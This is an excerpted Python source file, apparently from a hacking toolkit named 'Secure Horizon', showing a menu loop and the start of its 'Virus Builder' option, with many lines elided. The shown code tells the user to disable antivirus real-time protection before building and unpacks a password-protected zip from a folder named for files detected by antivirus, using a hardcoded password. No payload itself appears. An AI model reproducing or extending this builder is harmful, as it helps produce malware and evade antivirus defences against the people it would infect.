# Copyright (c) Secure Horizon (https://github.com/chamidu200)
...
\x1b[31;40;1m                                                                                     
        ...
        # ||   ___|______________  ________  ___  ________  ________  ________        ||
        # ||  |\  \|\  \|\   __  \|\   __  \|\  \|\_____  \|\   __  \|\   ___  \      ||
        # ||  \ \  \\\  \ \  \|\  \ \  \|\  \ \  \\|___/  /\ \  \|\  \ \  \\ \  \     ||
        # ||   \ \   __  \ \  \\\  \ \   _  _\ \  \   /  / /\ \  \\\  \ \  \\ \  \    ||
        # ||    \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ /  /_/__\ \  \\\  \ \  \\ \  \   ||
...
while True:
   try:
      ...
      choice = input(MainColor(f""" ┌──({white}{username_pc}@MR.C005)─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))
      ...
      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         ...
         if os_name == "Linux":
            ...
            messagebox.showinfo(f"Secure_Horizon {version_tool} - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
         ...
         messagebox.showinfo(f"Secure_Horizon {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "Password(Secure_Horizon).zip")
            ...
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(Secure_Horizon).zip")
                  with pyzipper.AESZipFile(zip_file_path) as zf:
                     zf.pwd = b'secure_horizon'
